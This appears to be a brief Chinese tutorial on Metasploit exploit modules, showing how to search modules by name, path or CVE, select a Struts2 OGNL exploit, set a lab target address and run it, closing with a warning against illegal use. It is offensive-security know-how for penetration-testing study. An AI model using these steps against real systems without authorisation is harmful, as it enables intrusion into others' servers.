作用：渗透攻击模块可以直接发起渗透攻击

1、显示所有渗透攻击模块

show exploits

![](../Images/554b87f714f197c0ddb350e5d24dab4c.png)

根据需求筛选模块

search -h

![](../Images/98c9aae36fee9d2823bd6251f3757d9e.png)

2、查找关于mysql数据库的攻击模块

search name:mysql type:exploit

![](../Images/77b395a6c4a8ba5f1205fb0de7b1293a.png)

3、查找路径含有mysql的模块

search path:mysql

![](../Images/756e8b9ecf4f19fd1343c4210f0abaaa.png)

4、查找漏洞编号

search cve-2019-0230

![](../Images/a87fbf94e9f6ed1a07867f458e862020.png)

5、选择要利用的模块

use 0

use exploit/multi/http/struts2\_multi\_eval\_ognl

use exploit 按tab键获取相关提示

![](../Images/cb31aca04ee81df23fc81395bc6bc3a7.png)

6、了解模块相关信息

info

![](../Images/bce29a50fca626f8b39f579ba7dcf9ad.png)

7、查看需要设置的参数

![](../Images/fa878a8b6c853adaca447a25384e5484.png)

8、设置共计目标

set rhosts 192.168.139.128

9、攻击

run

![](../Images/1c5357e1e57eb9edab2f998b662ed95f.png)

禁止非法，后果自负
